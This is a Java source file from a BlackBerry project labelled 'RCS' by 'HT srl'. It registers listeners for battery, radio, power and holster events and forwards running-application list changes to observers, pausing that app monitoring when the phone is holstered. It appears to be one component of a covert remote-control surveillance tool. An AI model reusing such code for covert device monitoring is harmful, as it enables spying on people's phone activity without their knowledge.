/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : AppListener.java
 * Created      : 28-apr-2010
 * *************************************************/

package blackberry;

import java.util.Vector;

import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.HolsterListener;
import net.rim.device.api.system.RadioStatusListener;
import net.rim.device.api.system.SystemListener;
import net.rim.device.api.system.SystemListener2;
import blackberry.interfaces.ApplicationListObserver;
import blackberry.interfaces.BatteryStatusObserver;
import blackberry.interfaces.Singleton;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The listener interface for receiving app events. The class that is interested
 * in processing a app event implements this interface, and the object created
 * with that class is registered with a component using the component's
 * <code>addAppListener<code> method. When
 * the app event occurs, that object's appropriate
 * method is invoked.
 * 
 * @see AppEvent
 */
public final class AppListener implements RadioStatusListener, HolsterListener,
        SystemListener, SystemListener2, Singleton {

    // #debug
    static Debug debug = new Debug("AppListener", DebugLevel.VERBOSE);

    static private int lastStatus;
    Vector batteryStatusObservers = new Vector();
    Vector applicationListObservers = new Vector();

    Task task;

    //private Timer applicationTimer;

    static AppListener instance;

    /**
     * Instantiates a new app listener.
     */
    private AppListener() {
        lastStatus = DeviceInfo.getBatteryStatus();
        task = Task.getInstance();
    }

    /**
     * Gets the single instance of AppListener.
     * 
     * @return single instance of AppListener
     */
    public synchronized static AppListener getInstance() {
        if (instance == null) {
            instance = new AppListener();
        }
        return instance;
    }

    /**
     * Adds the battery status observer.
     * 
     * @param observer
     *            the observer
     */
    public synchronized void addBatteryStatusObserver(
            final BatteryStatusObserver observer) {

        // #ifdef DBC
        Check.requires(!batteryStatusObservers.contains(observer),
                "already observing");
        // #endif

        // #debug debug
        debug.trace("adding observer: " + observer);
        batteryStatusObservers.addElement(observer);
    }

    /**
     * Adds the application list observer.
     * 
     * @param observer
     *            the observer
     */
    public synchronized void addApplicationListObserver(
            final ApplicationListObserver observer) {

        // #ifdef DBC
        Check.requires(!applicationListObservers.contains(observer),
                "already observing");
        // #endif

        // #debug debug
        debug.trace("adding observer: " + observer);
        applicationListObservers.addElement(observer);
    }

    /**
     * Removes the battery status observer.
     * 
     * @param observer
     *            the observer
     */
    public synchronized void removeBatteryStatusObserver(
            final BatteryStatusObserver observer) {
        // #debug debug
        debug.trace("removing observer: " + observer);

        if (batteryStatusObservers.contains(observer)) {
            batteryStatusObservers.removeElement(observer);
        } else {
            // #debug
            debug.error("removing observer not present: " + observer);
        }
    }

    /**
     * Removes the application list observer.
     * 
     * @param observer
     *            the observer
     */
    public synchronized void removeApplicationListObserver(
            final ApplicationListObserver observer) {
        // #debug debug
        debug.trace("removing observer: " + observer);

        if (applicationListObservers.contains(observer)) {
            applicationListObservers.removeElement(observer);
        } else {
            // #debug
            debug.error("removing observer not present: " + observer);
        }
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#baseStationChange()
     */
    public void baseStationChange() {
        // #debug info
        debug.info("baseStationChange");
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryGood()
     */
    public void batteryGood() {
        // #debug info
        debug.info("batteryGood");
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryLow()
     */
    public void batteryLow() {
        // #debug info
        debug.info("batteryLow");
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryStatusChange(int)
     */
    public synchronized void batteryStatusChange(final int status) {
        // #debug info
        debug.info("batteryStatusChange arg: " + status);

        final int diff = (status ^ lastStatus);

        int size = batteryStatusObservers.size();
        for (int i = 0; i < size; i++) {

            BatteryStatusObserver observer = (BatteryStatusObserver) batteryStatusObservers
                    .elementAt(i);
            // #debug debug
            debug.trace("notify: " + observer);

            observer.onBatteryStatusChange(status, diff);
        }

        lastStatus = status;
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryStatusChange(int)
     */
    /**
     * Application list change.
     * 
     * @param startedList
     *            the started list
     * @param stoppedList
     *            the stopped list
     * @param stoppedListMod
     * @param startedListMod
     */
    public void applicationListChange(final Vector startedListName,
            final Vector stoppedListName, final Vector startedListMod,
            final Vector stoppedListMod) {
        // #debug info
        debug.info("applicationListChange start: " + startedListName.size() + " stopped: " + stoppedListName.size());

        //#ifdef DBC
        Check.requires(startedListName.size() == startedListMod.size(),
                "applicationListChange");
        Check.requires(stoppedListName.size() == stoppedListMod.size(),
                "applicationListChange");
        //#endif

        int size = applicationListObservers.size();
        for (int i = 0; i < size; i++) {

            ApplicationListObserver observer = (ApplicationListObserver) applicationListObservers
                    .elementAt(i);
            // #debug debug
            debug.trace("notify: " + observer);

            observer.onApplicationListChange(startedListName, stoppedListName,
                    startedListMod, stoppedListMod);
        }
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.HolsterListener#inHolster()
     */
    public void inHolster() {
        // #debug info
        debug.info("inHolster");

        // interrompe l'analisi degli applicativi
        task.stopApplicationTimer();
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.HolsterListener#outOfHolster()
     */
    public void outOfHolster() {
        // #debug info
        debug.info("outOfHolster");

        // riprende l'analisi degli applicativi
        // se c'e' una variazione nella lista comunica la lista agli observer
        // viene fatto con un timer
        task.startApplicationTimer();
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.RadioStatusListener#networkScanComplete(boolean
     * )
     */
    public void networkScanComplete(final boolean success) {
        // #debug info
        debug.info("networkScanComplete success: " + success);
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.RadioStatusListener#networkServiceChange(int,
     * int)
     */
    public void networkServiceChange(final int networkId, final int service) {
        // #debug info
        debug.info("networkServiceChange networkId: " + networkId + " service : " + service);
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#networkStarted(int,
     * int)
     */
    public void networkStarted(final int networkId, final int service) {
        // #debug info
        debug.info("networkStarted networkId: " + networkId + " service : "+ service);
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.RadioStatusListener#networkStateChange(int)
     */
    public void networkStateChange(final int state) {
        // #debug info
        debug.info("networkStateChange state: " + state);
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#pdpStateChange(int,
     * int, int)
     */
    public void pdpStateChange(final int apn, final int state, final int cause) {
        // #debug info
        debug.info("pdpStateChange apn: " + apn + " state: " + state + "cause :" + cause);
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#powerOff()
     */
    public void powerOff() {
        // #debug info
        debug.info("powerOff");
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#powerUp()
     */
    public void powerUp() {
        // #debug info
        debug.info("powerUp");
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#radioTurnedOff()
     */
    public void radioTurnedOff() {
        // #debug info
        debug.info("radioTurnedOff");
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#signalLevel(int)
     */
    public void signalLevel(final int level) {
        // #debug info
        debug.info("signalLevel: " + level);
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.SystemListener2#backlightStateChange(boolean)
     */
    public void backlightStateChange(final boolean on) {
        // #debug info
        debug.info("backlightStateChange: " + on);

    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener2#cradleMismatch(boolean)
     */
    public void cradleMismatch(final boolean mismatch) {
        // #debug info
        debug.info("cradleMismatch: " + mismatch);
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener2#fastReset()
     */
    public void fastReset() {
        // #debug info
        debug.info("fastReset");
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener2#powerOffRequested(int)
     */
    public void powerOffRequested(final int reason) {
        // #debug info
        debug.info("powerOffRequested: " + reason);

    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.SystemListener2#usbConnectionStateChange(int)
     */
    public void usbConnectionStateChange(int state) {
        // #debug info
        debug.info("usbConnectionStateChange: " + state);
    }

}
